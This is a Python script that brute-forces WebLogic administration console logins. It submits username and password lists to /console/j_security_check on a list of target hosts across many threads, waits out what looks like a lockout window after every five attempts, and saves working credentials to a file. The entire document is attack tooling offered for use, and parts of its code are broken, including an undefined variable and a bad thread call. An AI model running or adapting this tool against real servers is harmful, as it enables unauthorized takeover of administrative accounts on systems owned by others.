import requests
import time
import threading
import sys
import os

RETRY=3
MAX_THREAD=50

class Brute:
	def __init__(self):
		self.success=0
		self.fail=0
		self.error=0

	def _do_login(self,url,usr,pwd):
		data = {'j_username': usr, 'j_password': pwd}
		count=0
		while count < RETRY:
			try:
				s = requests.post('http://%s/console/j_security_check'%url, data=data, timeout=5)
				if s.content.count('Home Page') != 0 or s.content.count('WebLogic Server Console') != 0 or s.content.count('console.portal') != 0:
					print 'Success!!!!! %s\t%s/%s                                                                                    ' % (i, usr, pwd)
					self.success += 1
					f = open('success.txt', 'a')
					f.write('%s %s/%s' % (i, usr, pwd))
					f.close()
					return True
				else:
					return False
			except:
				count+=1
				time.sleep(1)
		self.error+=1

	def _main(self):
		for usr in open('usr.txt').readlines():
			count=0
			usr=usr.strip()
			for pwd in open('pwd.txt').readlines():
				count+=1
				pwd=pwd.strip()
				if count == 6:
					sec=310
					while sec != 0:
						print "Waiting,%s sec left\r" %sec,
						sec-=1
						time.sleep(1)
				with open('url_list') as f:
					for url in f:
						t = threading.Thread(target=_do_login, args=(url,))
						t.daemon = True
						while True:
							if threading.active_count() < MAX_THREAD:
								t.start()
								print "Current threads: %d,Success:%d,Error:%d\r" % (threading.active_count(),self.success,self.error ),
								break
							else:
								time.sleep(1)

run=Brute()
run._main()
